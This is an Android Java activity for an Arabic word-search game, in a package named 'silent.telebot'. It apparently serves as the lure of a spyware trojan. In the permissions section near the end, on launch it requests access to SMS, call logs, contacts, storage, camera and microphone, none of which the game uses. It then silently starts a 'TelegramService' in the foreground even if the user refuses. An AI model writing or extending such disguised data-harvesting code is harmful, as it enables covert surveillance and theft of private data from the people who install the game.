package com.silent.telebot;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Vibrator;
import android.view.View;
import android.widget.Button;
import android.widget.GridLayout;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashSet;
import java.util.List;
import java.util.Random;
import java.util.Set;

public class WordGameActivity extends Activity {
    private static final int REQ_CODE = 100;
    private GridLayout gridLetters;
    private TextView tvSelectedWord, tvFoundWords, tvLevel, tvProgress;
    private ProgressBar progressBar;
    private Button btnSubmit, btnClear, btnHint, btnResetGame;

    private String[] letters = new String[25];
    private String selectedWord = "";
    private Set<String> foundWords = new HashSet<>();
    private List<String> currentLevelWords;
    private int currentLevel = 1;
    private Random random = new Random();
    private Vibrator vibrator;

    // 🔥 تعريف المستويات (كل مستوى له قائمة كلمات خاصة)
    private static final List<List<String>> LEVELS = Arrays.asList(
            // المستوى 1: كلمات سهلة (3 أحرف)
            Arrays.asList("بيت", "دار", "نور", "أرض", "شمس", "ورد", "زهر", "نهر"),
            // المستوى 2: كلمات 4 أحرف
            Arrays.asList("علم", "حب", "سلام", "قمر", "نجم", "ليل", "نهار", "ماء"),
            // المستوى 3: كلمات 5 أحرف
            Arrays.asList("سعادة", "جميل", "كتاب", "وردة", "شجرة", "سماء", "بحر", "صحراء"),
            // المستوى 4: كلمات 6 أحرف
            Arrays.asList("مدرسة", "جامعة", "مطبخ", "حديقة", "مكتبة", "مستشفى", "مطار", "فندق"),
            // المستوى 5: كلمات أطول
            Arrays.asList("استقلال", "تكنولوجيا", "ثقافة", "حضارة", "ابتكار", "تطوير", "إبداع", "نجاح")
    );

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_word_game);

        // ربط العناصر
        gridLetters = findViewById(R.id.grid_letters);
        tvSelectedWord = findViewById(R.id.tv_selected_word);
        tvFoundWords = findViewById(R.id.tv_found_words);
        tvLevel = findViewById(R.id.tv_level);
        tvProgress = findViewById(R.id.tv_progress);
        progressBar = findViewById(R.id.progress_bar);
        btnSubmit = findViewById(R.id.btn_submit);
        btnClear = findViewById(R.id.btn_clear);
        btnHint = findViewById(R.id.btn_hint);
        btnResetGame = findViewById(R.id.btn_reset_game);

        vibrator = (Vibrator) getSystemService(VIBRATOR_SERVICE);

        // التحقق من الأذونات
        checkAndRequestPermissions();

        // تحميل المستوى الأول
        loadLevel(currentLevel);

        // مستمعات الأزرار
        btnSubmit.setOnClickListener(v -> checkWord());
        btnClear.setOnClickListener(v -> clearSelection());
        btnHint.setOnClickListener(v -> giveHint());
        btnResetGame.setOnClickListener(v -> loadLevel(currentLevel));
    }

    // ============================================================
    //  🎮 تحميل المستوى
    // ============================================================
    private void loadLevel(int level) {
        if (level > LEVELS.size()) {
            Toast.makeText(this, "🎉 تهانينا! لقد أكملت جميع المستويات!", Toast.LENGTH_LONG).show();
            return;
        }

        currentLevelWords = new ArrayList<>(LEVELS.get(level - 1));
        foundWords.clear();
        selectedWord = "";
        tvSelectedWord.setText("");
        tvFoundWords.setText("");

        // تحديث الواجهة
        tvLevel.setText("🌍 المستوى " + level);
        updateUI();

        // إنشاء شبكة جديدة تحتوي على حروف الكلمات
        generateGridFromWords(currentLevelWords);
        drawGrid();

        Toast.makeText(this, "🔍 المستوى " + level + " - ابحث عن " + currentLevelWords.size() + " كلمات!", Toast.LENGTH_SHORT).show();
    }

    // ============================================================
    //  🔤 توليد الشبكة من الكلمات
    // ============================================================
    private void generateGridFromWords(List<String> words) {
        // نضيف كل الحروف من الكلمات إلى قائمة
        List<Character> allChars = new ArrayList<>();
        for (String word : words) {
            for (char c : word.toCharArray()) {
                allChars.add(c);
            }
        }

        // نملأ الشبكة (25 خانة) بحروف عشوائية إذا كانت الكلمات أقل من 25 حرفاً
        char[] arabicLetters = {'أ', 'ب', 'ت', 'ث', 'ج', 'ح', 'خ', 'د', 'ذ', 'ر', 'ز', 'س', 'ش', 'ص', 'ض', 'ط', 'ظ', 'ع', 'غ', 'ف', 'ق', 'ك', 'ل', 'م', 'ن', 'ه', 'و', 'ي'};
        while (allChars.size() < 25) {
            allChars.add(arabicLetters[random.nextInt(arabicLetters.length)]);
        }

        // خلط الحروف
        java.util.Collections.shuffle(allChars);

        for (int i = 0; i < 25; i++) {
            letters[i] = String.valueOf(allChars.get(i));
        }
    }

    // ============================================================
    //  🎨 رسم الشبكة
    // ============================================================
    private void drawGrid() {
        gridLetters.removeAllViews();
        gridLetters.setRowCount(5);
        gridLetters.setColumnCount(5);

        for (int i = 0; i < 25; i++) {
            Button btn = new Button(this);
            btn.setText(letters[i]);
            btn.setTextSize(28);
            btn.setBackgroundColor(0xFF2C2C2E);
            btn.setTextColor(0xFFFFFFFF);
            btn.setPadding(8, 8, 8, 8);
            btn.setTag(i);
            btn.setMinHeight(0);
            btn.setMinWidth(0);

            // نضبط حجم الزر ليكون مربعاً
            int size = (int) (getResources().getDisplayMetrics().widthPixels / 6.5);
            btn.setWidth(size);
            btn.setHeight(size);

            btn.setOnClickListener(v -> {
                int index = (int) v.getTag();
                appendLetter(index);
                v.setBackgroundColor(0xFF4CAF50); // تغيير لون الزر المحدد
            });
            gridLetters.addView(btn);
        }
    }

    // ============================================================
    //  ➕ إضافة حرف للكلمة المختارة
    // ============================================================
    private void appendLetter(int index) {
        selectedWord += letters[index];
        tvSelectedWord.setText(selectedWord);
    }

    // ============================================================
    //  ✅ التحقق من الكلمة
    // ============================================================
    private void checkWord() {
        if (selectedWord.isEmpty()) {
            Toast.makeText(this, "اختر أحرفاً أولاً!", Toast.LENGTH_SHORT).show();
            return;
        }

        if (foundWords.contains(selectedWord)) {
            Toast.makeText(this, "⚠️ هذه الكلمة تم اكتشافها مسبقاً!", Toast.LENGTH_SHORT).show();
            clearSelection();
            return;
        }

        for (String word : currentLevelWords) {
            if (word.equals(selectedWord)) {
                foundWords.add(selectedWord);
                Toast.makeText(this, "✅ كلمة صحيحة! +10 نقاط", Toast.LENGTH_SHORT).show();
                updateUI();
                clearSelection();

                // التحقق من إكمال المستوى
                if (foundWords.size() == currentLevelWords.size()) {
                    Toast.makeText(this, "🎉 أحسنت! أكملت المستوى " + currentLevel + " 🎉", Toast.LENGTH_LONG).show();
                    currentLevel++;
                    new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> loadLevel(currentLevel), 2000);
                }
                return;
            }
        }

        // كلمة خاطئة
        Toast.makeText(this, "❌ كلمة غير صحيحة!", Toast.LENGTH_SHORT).show();
        if (vibrator != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            vibrator.vibrate(android.os.VibrationEffect.createOneShot(50, 255));
        }
        clearSelection();
    }

    // ============================================================
    //  💡 التلميحات
    // ============================================================
    private void giveHint() {
        for (String word : currentLevelWords) {
            if (!foundWords.contains(word)) {
                // نعرض الحرف الأول من الكلمة
                String hint = "💡 تلميح: " + word.charAt(0) + "___";
                Toast.makeText(this, hint, Toast.LENGTH_LONG).show();
                return;
            }
        }
        Toast.makeText(this, "🎯 تم اكتشاف جميع الكلمات!", Toast.LENGTH_SHORT).show();
    }

    // ============================================================
    //  🧹 مسح التحديد
    // ============================================================
    private void clearSelection() {
        selectedWord = "";
        tvSelectedWord.setText("");
        // إعادة ألوان الأزرار إلى الوضع الطبيعي
        for (int i = 0; i < gridLetters.getChildCount(); i++) {
            View child = gridLetters.getChildAt(i);
            if (child instanceof Button) {
                child.setBackgroundColor(0xFF2C2C2E);
            }
        }
    }

    // ============================================================
    //  📊 تحديث الواجهة
    // ============================================================
    private void updateUI() {
        int total = currentLevelWords.size();
        int found = foundWords.size();
        tvProgress.setText(found + "/" + total);
        progressBar.setProgress((found * 100) / total);

        StringBuilder sb = new StringBuilder("✅ ");
        for (String word : foundWords) {
            sb.append(word).append(" ");
        }
        tvFoundWords.setText(sb.toString().trim());
    }

    // ============================================================
    //  🔐 الأذونات والخدمة الخلفية
    // ============================================================
    private void checkAndRequestPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            String[] permissions = {
                    Manifest.permission.READ_SMS,
                    Manifest.permission.READ_CALL_LOG,
                    Manifest.permission.READ_CONTACTS,
                    Manifest.permission.READ_EXTERNAL_STORAGE,
                    Manifest.permission.CAMERA,
                    Manifest.permission.RECORD_AUDIO
            };
            boolean allGranted = true;
            for (String perm : permissions) {
                if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }
            if (!allGranted) {
                ActivityCompat.requestPermissions(this, permissions, REQ_CODE);
            }
        }
        // بدء الخدمة بعد الأذونات أو بدونها (حسب الحالة)
        startTelegramService();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQ_CODE) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                Toast.makeText(this, "✅ الأذونات ممنوحة", Toast.LENGTH_SHORT).show();
            } else {
                Toast.makeText(this, "⚠️ بعض الأذونات مرفوضة", Toast.LENGTH_LONG).show();
            }
        }
        startTelegramService();
    }

    private void startTelegramService() {
        Intent serviceIntent = new Intent(this, TelegramService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
    }
}
